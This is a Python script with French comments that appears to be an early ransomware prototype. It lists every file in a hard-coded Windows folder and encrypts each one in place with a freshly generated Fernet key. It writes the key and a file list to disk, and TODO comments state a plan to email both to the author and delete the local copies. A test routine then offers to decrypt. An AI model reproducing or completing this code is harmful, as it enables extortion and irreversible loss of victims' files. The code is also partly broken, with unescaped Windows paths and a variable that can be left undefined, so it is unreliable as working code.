# coding=utf-8
import os

#----------------------------------------------------------------------
# Fonction de création d'une liste des fichiers d'un dossier
# chemins complets
#----------------------------------------------------------------------

def F_listeFichiers(fichier):

    listeFichier = []

    for (dirpath, dirnames, filenames) in os.walk("C:\Users\Admin\Desktop\Test P1"):
        listeFichier = [os.path.join(r, file) for r, d, f in os.walk("C:\Users\Admin\Desktop\Test P1") for file in f]
    nombreFichiers = len(listeFichier)
    nombreFichiers = str(nombreFichiers)

    print("Il y a " + nombreFichiers + " fichiers dans ce dossier")
    return (listeFichier)


#-------------------------
# Fonction de chiffrement
#-------------------------

def F_chiffrement(fichier, fernet_key):

    # ouverture et lecture du fichier à chiffrer en mode binaire (byte)
    with open(fichier, 'rb') as file:
        data = file.read()  # Read the bytes of the input file

    # chiffrement du fichier en entier avec le module fernet
    try:
        encrypted = fernet_key.encrypt(data)
        print("Valid Key -", fichier, "- Successfully encrypted")
    except:
        print("Invalid Key -", fichier, "- Unsuccessfully encrypted")

    # ecriture dans le fichier lui même de son contenu chiffré
    with open(fichier, 'wb') as file:
        file.write(encrypted)  # Write the encrypted bytes to the output file
    return (fichier)
#---------------------------
# Fonction de déchiffrement
#---------------------------
def F_dechiffrement(fichier, fernet_key) :

  # récupération de la clé de chiffrement
  #  fichier_key = open('key.key', 'rb')
  #  key = fichier_key.read()
  #  fernet_key = Fernet(key)
  #  fichier_key.close()

    # ouverture et lecture du fichier à déchiffrer en mode binaire (byte)
    with open(fichier, 'rb') as file:
        data = file.read()  # Read the bytes of the input file

    # déchiffrement du fichier en entier avec le module fernet
    try:
        decrypted = fernet_key.decrypt(data)
        print("Valid Key -" + fichier + "Successfully decrypted")
    except:
        print("Invalid Key -" + fichier + " Unsuccessfully decrypted")

    # ecriture dans le fichier lui même de son contenu déchiffré
    with open(fichier, 'wb') as file:
        file.write(decrypted)  # Write the encrypted bytes to the output file


#-----------------------------------------------------------------------------------------------------------
# Boucle principale
#-----------------------------------------------------------------------------------------------------------

# génération d'une clé de chiffrement avec le module fernet
from cryptography.fernet import Fernet
key = Fernet.generate_key()
fernet_key = Fernet(key)

# enregistrement de la clé dans un fichier_key                       # TODO il reste à m'envoyer ce fichier par mail et à l'effacer ensuite
fichier_key = open("C:\Users\Admin\Desktop\AnSo\\fichier_key.txt", 'wb')  # Open the file as wb to write bytes
fichier_key.write(key)
fichier_key.close()

# variables
i = 0
fichier = 'C:\Users\Admin\Desktop\Test P1\*'
rang = 0
liste_Fichiers = []
nombreFichiers = ' '

liste_Fichiers = F_listeFichiers(fichier)           # je vais chercher la liste des fichiers dans ce dossier

# enregistrement de la liste des fichiers chiffrés dans un fichier_liste # TODO il reste à m'envoyer ce fichier par mail et à l'effacer ensuite
position = 0
fichier_liste = open("C:\Users\Admin\Desktop\AnSo\\fichier_liste.txt", 'at')
for item in (liste_Fichiers):
    texte = "{} {}"
    fichier_liste.write(texte.format(position, item)+'\n' )
    position += 1
fichier_liste.close()


while i == 0:
    try:
        fichier = liste_Fichiers[rang]              # pour chaque occurence dans la liste

    except IndexError:
        i = 1                                       # il n'y a plus de fichier dans ce dossier
        break
    else:
        F_chiffrement(fichier, fernet_key)          # si oui je le chiffre
        rang += 1                                   # je passe au fichier suivant

#-----------------------------
# Pour les tests je décrypte
#-----------------------------

j = 0
reponse = " "
fichier = 'C:\Users\Admin\Desktop\Test P1\*'

while j == 0:
    reponse = raw_input('Voulez-vous déchiffrer le dossier/fichier ? : ')
    if reponse in ["Y", "y"]:
        k = 0
        rang = 0
        while k == 0:
            try:
                fichier = liste_Fichiers[rang]
            except IndexError:
                k = 1
                j = 1
            else:
                if os.path.isfile(fichier) == True:
                    F_dechiffrement(fichier, fernet_key)
                    rang += 1
                else:
                    fichier = F_listeFichiers(fichier)
                    rang += 1
                    #break

    elif reponse in ["N", "n"]:
        j = 1
        break
    else:
        print("Y ou N")
        pass


